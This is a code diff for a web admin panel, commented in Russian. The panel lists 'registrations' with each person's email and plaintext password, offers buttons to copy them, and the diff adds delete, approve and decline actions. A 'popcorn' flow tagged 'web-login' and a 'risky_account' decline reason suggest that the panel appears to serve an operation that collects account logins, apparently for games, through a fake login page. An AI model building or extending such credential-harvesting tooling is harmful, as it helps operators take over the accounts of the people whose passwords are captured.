@@ -403,8 +403,8 @@
           и “попкорн”-логины (flow <strong>popcorn</strong>).
           Попкорн можно распознать по <strong>flow = POPCORN</strong> и/или
           <code>ingameId = web-login</code>.  
-          Через действия справа можно <strong>approve / decline</strong> заявку
-          и копировать email / password.
+          Через действия справа можно <strong>approve / decline</strong> заявку,
+          удалить запись и копировать email / password.
         </div>
 
         <div class="card">
@@ -454,20 +454,21 @@
 </div>
 
 <script>
-  // ===== CONFIG: под твой server.js =====
-  const API_BASE = "/admin/api";
-  const STATE_URL = API_BASE + "/state";                    // GET -> { idCodeRequests, emailCodeRequests, registrations }
-  const APPROVE_URL = API_BASE + "/registration/approve";   // POST -> { id, slot, link, note }
-  const DECLINE_URL = API_BASE + "/registration/decline";   // POST -> { id, reason, note }
+  // ========= CONFIG: совместимо со старым backend =========
+  const API_BASE   = "/admin/api";
+  const STATE_URL  = API_BASE + "/state";                 // GET -> { idCodeRequests, emailCodeRequests, registrations }
+  const APPROVE_URL= API_BASE + "/registration/approve";  // POST -> { id, slot, link, note }
+  const DECLINE_URL= API_BASE + "/registration/decline";  // POST -> { id, reason, note }
+  const DELETE_URL = API_BASE + "/registration/delete";   // POST -> { id }
 
-  const tbodyEl = document.getElementById("logs-tbody");
-  const countPill = document.getElementById("logs-count-pill");
+  const tbodyEl    = document.getElementById("logs-tbody");
+  const countPill  = document.getElementById("logs-count-pill");
   const globalStatusEl = document.getElementById("global-status");
-  const reloadBtn = document.getElementById("reload-btn");
+  const reloadBtn  = document.getElementById("reload-btn");
 
   function setStatus(text, type) {
     globalStatusEl.textContent = text || "";
-    globalStatusEl.className = "global-status" + (type ? " " + type : "");
+    globalStatusEl.className   = "global-status" + (type ? " " + type : "");
   }
 
   function formatDate(iso) {
@@ -475,13 +476,10 @@
     const d = new Date(iso);
     if (isNaN(d.getTime())) return iso;
     const date = d.toLocaleDateString("en-GB", {
-      day: "2-digit",
-      month: "2-digit",
-      year: "numeric"
+      day: "2-digit", month: "2-digit", year: "numeric"
     });
     const time = d.toLocaleTimeString("en-GB", {
-      hour: "2-digit",
-      minute: "2-digit"
+      hour: "2-digit", minute: "2-digit"
     });
     return date + " " + time;
   }
@@ -515,7 +513,7 @@
       return;
     }
 
-    // сортируем по дате (новые сверху), если есть createdAt
+    // новые сверху
     items.sort((a, b) => {
       const da = new Date(a.createdAt || 0).getTime();
       const db = new Date(b.createdAt || 0).getTime();
@@ -525,22 +523,21 @@
     countPill.textContent = items.length + (items.length === 1 ? " item" : " items");
 
     const rows = items.map((item, idx) => {
-      const id = item.id ?? item.pk ?? idx;
-      const flow = (item.flow || "").toLowerCase();
-      const email = item.email || "";
-      const password = item.password || item.pass || "";
-      const ingameId = item.ingameId || "";
-      const accessCode = item.accessCode || "";
-      const created = formatDate(item.createdAt || item.created_at || item.timestamp);
+      const id        = item.id ?? item.pk ?? idx;
+      const flowRaw   = (item.flow || "hub").toLowerCase();
+      const email     = item.email || "";
+      const password  = item.password || item.pass || "";
+      const ingameId  = item.ingameId || "";
+      const accessCode= item.accessCode || "";
+      const created   = formatDate(item.createdAt || item.created_at || item.timestamp);
 
-      const idVerified = item.idVerified ? "ID✔" : "ID–";
-      const emailVerified = item.emailVerified ? "Mail✔" : "Mail–";
-
-      const status = (item.status || "pending").toLowerCase();
+      const idVerified    = item.idVerified    ? "✔" : "—";
+      const emailVerified = item.emailVerified ? "✔" : "—";
+      const statusRaw     = (item.status || "pending").toLowerCase();
 
       let flowChipClass = "chip";
-      let flowLabel = "HUB";
-      if (flow === "popcorn") {
+      let flowLabel     = "HUB";
+      if (flowRaw === "popcorn") {
         flowChipClass += " chip--popcorn";
         flowLabel = "POPCORN";
       } else {
@@ -548,9 +545,11 @@
       }
 
       let statusChipClass = "chip";
-      if (status === "approved") statusChipClass += " chip--status-approved";
-      else if (status === "declined") statusChipClass += " chip--status-declined";
+      if (statusRaw === "approved") statusChipClass += " chip--status-approved";
+      else if (statusRaw === "declined") statusChipClass += " chip--status-declined";
       else statusChipClass += " chip--status-pending";
+
+      const isFinal = statusRaw === "approved" || statusRaw === "declined";
 
       return `
         <tr data-id="${id}">
@@ -574,7 +573,7 @@
           </td>
           <td>
             <span class="${statusChipClass}">
-              <span class="chip-label">STATUS</span>${status.toUpperCase()}
+              <span class="chip-label">STATUS</span>${statusRaw.toUpperCase()}
             </span>
           </td>
           <td>${created || "—"}</td>
@@ -593,13 +592,20 @@
             </button>
             <button class="btn-xs btn-xs--primary"
                     data-action="approve"
-                    data-id="${id}">
+                    data-id="${id}"
+                    ${isFinal ? "disabled" : ""}>
               ✅ Approve
             </button>
             <button class="btn-xs btn-xs--danger"
                     data-action="decline"
-                    data-id="${id}">
+                    data-id="${id}"
+                    ${isFinal ? "disabled" : ""}>
               ❌ Decline
+            </button>
+            <button class="btn-xs btn-xs--danger"
+                    data-action="delete"
+                    data-id="${id}">
+              🗑 Delete
             </button>
           </td>
         </tr>
@@ -612,7 +618,7 @@
   async function loadState() {
     setStatus("Loading registrations…", "");
     try {
-      const data = await getJSON(STATE_URL);
+      const data  = await getJSON(STATE_URL);
       const items = data && Array.isArray(data.registrations)
         ? data.registrations
         : [];
@@ -632,17 +638,17 @@
   }
 
   function findRowData(id) {
-    const row = tbodyEl.querySelector(`tr[data-id="${id}"]`);
+    const row = tbodyEl.querySelector('tr[data-id="' + id + '"]');
     if (!row) return {};
     const cells = row.children;
     return {
-      email: cells[2]?.textContent.trim() || "",
+      email:    cells[2]?.textContent.trim() || "",
       password: cells[3]?.textContent.trim() || ""
     };
   }
 
   async function copyField(id, field) {
-    const data = findRowData(id);
+    const data  = findRowData(id);
     const value = data[field] || "";
     if (!value) return;
     try {
@@ -656,7 +662,7 @@
 
   async function approveRegistration(id) {
     const slot = prompt("Slot (optional, e.g. GROUP A / LOBBY 3):", "");
-    if (slot === null) return; // cancel
+    if (slot === null) return;
     const link = prompt("Link (optional, lobby / room link):", "");
     if (link === null) return;
     const note = prompt("Internal note (optional):", "");
@@ -674,7 +680,7 @@
   }
 
   async function declineRegistration(id) {
-    const reason = prompt("Decline reason (short):", "other");
+    const reason = prompt("Decline reason (short: invalid_email / risky_account / other):", "other");
     if (reason === null) return;
     const note = prompt("Internal note (optional):", "");
     if (note === null) return;
@@ -690,12 +696,25 @@
     }
   }
 
+  async function deleteRegistration(id) {
+    if (!confirm("Delete this registration? This cannot be undone.")) return;
+    setStatus("Deleting #" + id + "…", "");
+    try {
+      await postJSON(DELETE_URL, { id });
+      setStatus("Registration deleted.", "ok");
+      await loadState();
+    } catch (e) {
+      console.error(e);
+      setStatus("Failed to delete. Check backend.", "err");
+    }
+  }
+
   // делегируем клики по таблице
   tbodyEl.addEventListener("click", (e) => {
     const btn = e.target.closest("button[data-action]");
     if (!btn) return;
     const action = btn.getAttribute("data-action");
-    const id = btn.getAttribute("data-id");
+    const id     = btn.getAttribute("data-id");
     if (!action || !id) return;
 
     if (action === "copy") {
@@ -705,6 +724,8 @@
       approveRegistration(id);
     } else if (action === "decline") {
       declineRegistration(id);
+    } else if (action === "delete") {
+      deleteRegistration(id);
     }
   });
 
